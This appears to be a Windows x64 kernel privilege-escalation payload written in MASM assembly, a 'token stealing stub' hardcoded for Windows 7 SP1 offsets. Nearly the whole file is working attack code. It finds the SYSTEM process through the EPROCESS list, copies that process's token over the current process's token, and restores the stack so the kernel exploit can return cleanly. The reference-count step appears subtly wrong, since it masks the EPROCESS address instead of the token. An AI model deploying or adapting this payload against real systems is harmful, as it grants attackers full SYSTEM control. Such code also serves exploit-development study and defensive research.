.code
PUBLIC GetToken
GetToken   proc

; Start of Token Stealing Stub
xor rax, rax                    ; Set ZERO
mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax + 70h]            ; Get nt!_KTHREAD.ApcState.Process
mov rcx, rax                    ; Copy current process _EPROCESS structure
mov r11, rcx                    ; Store Token.RefCnt
and r11, 7

mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 188h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 188h
cmp[rax + 180h], rdx            ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 208h]           ; Get SYSTEM process nt!_EPROCESS.Token
and rdx, 0fffffffffffffff0h
or rdx, r11
mov[rcx + 208h], rdx            ; Replace target process nt!_EPROCESS.Token
                                ; with SYSTEM process nt!_EPROCESS.Token
                                ; End of Token Stealing Stub

; We still need to reconstruct a valid response
xor rax, rax                    ; Set NTSTATUS SUCCEESS

; Recreate the instructions that would've been executed if we didn't ruin the stack frame
add rsp, 028h
ret

GetToken ENDP
end